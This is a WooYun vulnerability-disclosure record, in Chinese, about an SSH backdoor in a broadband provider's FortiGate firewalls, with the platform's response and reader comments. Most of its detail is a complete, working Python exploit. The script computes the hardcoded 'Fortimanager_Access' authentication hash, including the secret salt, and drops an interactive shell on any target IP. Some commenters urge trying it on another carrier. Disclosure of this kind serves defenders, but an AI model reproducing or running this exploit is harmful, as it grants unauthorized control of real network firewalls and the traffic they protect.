{"id": 74830, "wybug_id": "wooyun-2016-0169505", "wybug_title": "鹏博士宽带FortiGate防火墙存在SSH后门（附脚本）", "wybug_corp": "Fortinet", "wybug_author": "路人甲", "wybug_date": "2016-01-13 14:09", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问", "后门"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 鹏博士宽带FortiGate防火墙存在SSH后门，可进行操作 详细说明：  FortiGate防火墙正常的访问方式是通过web，地址为**.**.**.**/login \n\n但是可以通过SSH后门的形式进行访问操作。    这里感谢Matt兄弟的脚本。进入后门可以对防火墙进行一系列的操作，这里为了不影响正常业务，只验证问题，做了show等操作。\n\n\n\n附上Matt牛的脚本。\n#!/usr/bin/env python# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7# Usage: ./fgt_ssh_backdoor.py <target-ip>import socketimport selectimport sysimport paramikofrom paramiko.py3compat import uimport base64import hashlibimport termiosimport ttydef custom_handler(title, instructions, prompt_list):    n = prompt_list[0][0]    m = hashlib.sha1()    m.update('\\x00' * 12)    m.update(n + 'FGTAbc11*xy+Qqz27')    m.update('\\xA3\\x88\\xBA\\x2E\\x42\\x4C\\xB0\\x4A\\x53\\x79\\x30\\xC1\\x31\\x07\\xCC\\x3F\\xA1\\x32\\x90\\x29\\xA9\\x81\\x5B\\x70')    h = 'AK1' + base64.b64encode('\\x00' * 12 + m.digest())    return [h]def main():    if len(sys.argv) < 2:        print 'Usage: ' + sys.argv[0] + ' <target-ip>'        exit(-1)    client = paramiko.SSHClient()    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    try:        client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)    except paramiko.ssh_exception.SSHException:        pass    trans = client.get_transport()    try:        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)    except paramiko.ssh_exception.AuthenticationException:        pass    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)    chan = client.invoke_shell()    oldtty = termios.tcgetattr(sys.stdin)    try:        tty.setraw(sys.stdin.fileno())        tty.setcbreak(sys.stdin.fileno())        chan.settimeout(0.0)        while True:            r, w, e = select.select([chan, sys.stdin], [], [])            if chan in r:                try:                    x = u(chan.recv(1024))                    if len(x) == 0:                        sys.stdout.write('\\r\\n*** EOF\\r\\n')                        break                    sys.stdout.write(x)                    sys.stdout.flush()                except socket.timeout:                    pass            if sys.stdin in r:                x = sys.stdin.read(1)                if len(x) == 0:                    break                chan.send(x)    finally:        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)if __name__ == '__main__':    main()\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-15 18:14 厂商回复： CNVD未直接复现所述情况，已由CNVD通过以往建立的处置渠道向网站管理方通报，由其后续提供解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-13 10:56 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1623 漏洞数:237        )\t\t \n  开播了~~    \n     2016-01-13 10:57 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:13        | 专注且自由)\t\t \n  这也太快了，哈哈哈    \n     2016-01-13 10:57 |    \t\t风若新 \t\t\t( 普通白帽子  |\t\t\t        Rank:222 漏洞数:59        | 爱生活，爱安全，爱攻防。)\t\t \n  我就知道有人开始搞了！    \n     2016-01-13 11:17 |    \t\t米怀特 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 安全真的安全么？)\t\t \n  还有一个电信的可以搞一下。    \n     2016-01-13 11:54 |    \t\t龍 、 \t\t\t( 普通白帽子  |\t\t\t        Rank:442 漏洞数:154        | 你若安好  我就是晴天)\t\t \n  还有一个电信的可以搞一下。    \n     2016-01-13 11:57 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:92        | 硬件与无线通信研究方向)\t\t \n  还有一个电信的可以搞一下。     \n     2016-01-13 14:35 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1850 漏洞数:296        | 风暴网络安全空间：http://www.heysec.or...)\t\t \n  鹏博士还存在一个非常严重的问题哦，非WEB漏洞    \n     2016-01-13 15:58 |    \t\tfakeidentity \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:7        | 既然给了我天空，那还束缚我干吗)\t\t \n  账号的名称也够可以,跟乌云多大的怨恨！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}